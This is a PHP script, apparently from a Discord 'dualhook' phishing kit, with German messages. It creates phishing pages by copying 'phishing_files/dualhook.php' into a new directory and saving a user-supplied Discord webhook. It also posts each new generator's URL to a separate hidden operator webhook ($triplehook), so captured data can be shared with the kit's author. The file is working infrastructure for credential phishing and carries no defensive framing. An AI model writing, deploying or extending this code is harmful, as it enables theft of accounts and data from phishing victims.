<?php
include("setup.php");

if (isset($_POST['directory'], $_POST['dwebhook'])) {
    $directory = $_POST['directory'];
    $dwebhook = $_POST['dwebhook'];
    
    // Überprüfen, ob die Webhook-URL gültig ist
    $parse = parse_url($dwebhook);
    if ($parse && ($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com')) {
        function clear_dir($string) {
            $string = str_replace(' ', '-', $string);
            return preg_replace('/[^A-Za-z0-9\-]/', '', $string);
        }
        $directory = clear_dir($directory);
        if (!empty($directory)) {
            $filename = "controlPage/$directory";
            if (!file_exists($filename)) {
                mkdir("controlPage/$directory", 0777, true);
                file_put_contents("controlPage/$directory/index.php", file_get_contents('phishing_files/dualhook.php'));
                file_put_contents("controlPage/$directory/d_webhook.txt", $_POST['dwebhook']);
                $domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
                $timestamp = date("c", strtotime("now"));
                $headers = ["Content-Type: application/json; charset=utf-8"];
                $POST = [
                    "username" => "$name - Bot",
                    "avatar_url" => "$thumbnail",
                    "content" => "@everyone **New User Made Dualhook Generator 🔥**",
                    "embeds" => [
                        [
                            "title" => "Check there Generator.",
                            "type" => "rich",
                            "url" => "$domain/controlPage/$directory", 
                            "color" => hexdec("$hex"),
                            "footer" => [
                                "text" => "$name • $timestamp",
                                "icon_url" => "$thumbnail"
                            ],
                            "thumbnail" => [
                                "url" => "$thumbnail",
                            ],
                            "fields" => [
                                [
                                    "name" => "**Dualhook Generator**",
                                    "value" => "```Dualhook Gen: $domain/controlPage/$directory```",
                                    "inline" => true
                                ]
                            ]
                        ],
                    ],
                ];

                $ch = curl_init();
                curl_setopt_array($ch, [
                    CURLOPT_URL => $triplehook,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($POST),
                    CURLOPT_HTTPHEADER => $headers,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_SSL_VERIFYPEER => false,
                ]);
                $response = curl_exec($ch);
                if ($response === false) {
                    $error = 'Fehler beim Senden der Benachrichtigung.';
                } else {
                    header("location: /controlPage/$directory");
                }
            } else {
                $error = 'Dieses Verzeichnis wird bereits verwendet!';
            }
        }
    } else {
        $error = 'Dies scheint keine gültige Webhook-URL zu sein!';
    }
}
?>
